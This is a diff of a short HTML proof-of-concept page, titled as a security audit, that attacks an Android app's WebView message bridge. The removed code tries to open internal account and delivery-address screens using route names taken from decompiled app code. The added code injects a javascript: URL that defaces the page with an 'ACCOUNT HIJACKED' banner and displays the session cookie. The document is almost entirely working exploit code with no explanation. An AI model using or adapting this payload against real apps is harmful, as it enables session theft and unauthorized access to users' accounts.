@@ -2,24 +2,10 @@
 <body>
      <h1>Oda Security Audit</h1>
      <script>
-         setTimeout(function() {
-             if (window.AndroidMessageHandler) {
-                 // Mencoba membuka layar internal Account Preferences
-                 // Route ID didapat dari analisa ib.C4170s0
-                 window.AndroidMessageHandler.postMessage(JSON.stringify({
-                     "command": "open-native-url",
-                     "url": "account_preferences_screen"
-                 }));
-
-                 // Backup: Mencoba membuka layar Delivery Address
-                 setTimeout(function() {
-                     window.AndroidMessageHandler.postMessage(JSON.stringify({
-                         "command": "open-native-url",
-                         "url": "delivery_address_screen"
-                     }));
-                 }, 1000);
-             }
-         }, 1000);
+        window.AndroidMessageHandler.postMessage(JSON.stringify({
+     "command": "open-url",
+     "url": "javascript:document.body.innerHTML='<h1 style=\"color:red;padding:50px\">ACCOUNT HIJACKED BY SINAR PAGI</h1>';alert('SessionID: ' + document.cookie);"
+}));
      </script>
 </body>
 </html>
